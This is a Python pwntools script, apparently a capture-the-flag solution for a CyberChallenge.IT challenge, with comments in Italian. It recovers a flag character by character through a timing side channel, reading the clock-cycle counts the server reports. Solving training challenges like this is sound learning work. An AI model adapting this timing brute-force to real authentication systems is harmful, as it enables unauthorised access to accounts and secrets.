from pwn import *
import string

# Disattiva output colorato di pwntools se vuoi più chiarezza
context.log_level = 'info'

# Caratteri possibili per la flag
charset = string.ascii_letters + string.digits + "{}_"

# Connessione remota
HOST = "benchmark.challs.cyberchallenge.it"
PORT = 9031

# Connessione remota, la manteniamo aperta per tutte le richieste
conn = remote(HOST, PORT)

# Funzione per provare un candidato e misurare i clock cycles
def try_flag(candidate):
    conn.recvuntil(b"Give me the password to check:\n")
    conn.sendline(candidate.encode())
    response = conn.recvuntil(b"clock cycles").decode()
    
    # Estrai il numero di clock cycles dalla risposta
    try:
        clock_cycles = int(response.split("checked in ")[-1].split(" ")[0])
    except:
        clock_cycles = 0
    
    print(f"Trying: {candidate} -> {clock_cycles} cycles")
    return clock_cycles

# Inizio della flag noto
flag = "CCIT{"
max_len = 50  # Limite arbitrario

# Prosegui finché non trovi la chiusura
while not flag.endswith("}") and len(flag) < max_len:
    best_char = None
    best_score = 0
    for c in charset:
        test = flag + c
        score = try_flag(test)
        if score > best_score:
            best_score = score
            best_char = c
    flag += best_char
    print(f"[+] Partial flag: {flag}")

print(f"[!] Final flag guess: {flag}")

# Chiudi la connessione alla fine (quando hai trovato la flag)
conn.close()
